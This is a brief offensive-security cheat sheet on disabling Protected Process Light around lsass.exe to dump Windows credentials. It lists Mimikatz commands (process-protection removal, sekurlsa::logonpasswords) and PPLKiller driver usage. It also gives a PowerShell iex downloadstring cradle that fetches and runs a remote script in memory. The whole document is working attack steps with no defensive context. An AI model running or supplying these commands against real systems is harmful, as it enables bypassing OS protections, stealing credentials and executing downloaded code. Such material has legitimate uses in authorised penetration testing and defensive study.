# Disabling PPL Protections

## Mimikatz
```
Token::elevate
Privilege::Debug
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
```

Restore Protection
```
!processprotect /process:lsass.exe
!-
```

## PPLKiller

URL: https://github.com/RedCursorSecurityConsulting/PPLKiller

```powershell
# Initiate
PPLKiller.exe /installDriver && PPLKiller.exe /disableLSAProtection

# Run Mimikatz
sekurlsa::logonpasswords

# Cleanup
PPLKiller.exe /uninstallDriver
```
## PPLKiller (C# Port)
URL: https://github.com/Leo4j/PPLKiller

```powershell
# Binary
.\PPLKiller.exe

# PowerShell
# Load into memory
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/PPLKiller/refs/heads/main/Invoke-PPLKiller.ps1')

# Execute
Invoke-PPLKiller
```
